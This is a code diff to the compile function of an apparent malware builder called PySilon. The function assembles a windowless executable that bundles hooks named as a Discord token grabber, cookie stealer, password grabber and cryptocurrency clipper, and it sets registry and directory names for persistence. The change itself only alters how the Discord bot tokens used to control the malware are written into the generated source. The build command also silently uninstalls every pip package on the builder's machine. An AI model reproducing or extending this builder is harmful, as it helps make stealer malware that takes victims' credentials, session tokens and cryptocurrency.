@@ -22,14 +22,14 @@ def compile(debug_mode):
     compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py ' + ('--runtime-hook=resources/protections.py ' if debug_mode else '') + '--runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --add-data="crypto_clipper.json;." --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
 
     token_1 = base64.b64encode(config['SETTINGS']['bot_token_1'].encode()).decode()
-    token_2 = base64.b64encode(config['SETTINGS']['bot_token_2'].encode()).decode() if config['SETTINGS']['bot_token_2'] != '' else ''
-    token_3 = base64.b64encode(config['SETTINGS']['bot_token_3'].encode()).decode() if config['SETTINGS']['bot_token_3'] != '' else ''
+    token_2 = base64.b64encode(config['SETTINGS']['bot_token_2'].encode()).decode() if config['SETTINGS']['bot_token_2'] != '' else None
+    token_3 = base64.b64encode(config['SETTINGS']['bot_token_3'].encode()).decode() if config['SETTINGS']['bot_token_3'] != '' else None
 
     with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
     with open('source_assembled.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
     with open('source_prepared.py', 'w', encoding='utf-8') as edit_source_code:
         for line_number, line in enumerate(source_code):
-            if line.startswith('bot_tokens'): edit_source_code.write(f"bot_tokens = ['{token_1}', '{token_2}', '{token_3}']\n")
+            if line.startswith('bot_tokens'): edit_source_code.write(f"bot_tokens = {[token for token in [token_1, token_2, token_3] if token is not None]}\n")
             elif line.startswith('software_registry_name'): edit_source_code.write('software_registry_name = \'' + config['SETTINGS']['registry_name'] + '\'\n')
             elif line.startswith('software_directory_name'): edit_source_code.write('software_directory_name = \'' + config['SETTINGS']['directory_name'] + '\'\n')
             elif line.startswith('software_executable_name'): edit_source_code.write('software_executable_name = \'' + config['SETTINGS']['executable_name'] + ('' if config['SETTINGS']['executable_name'].endswith('.exe') else '.exe') + '\'\n')
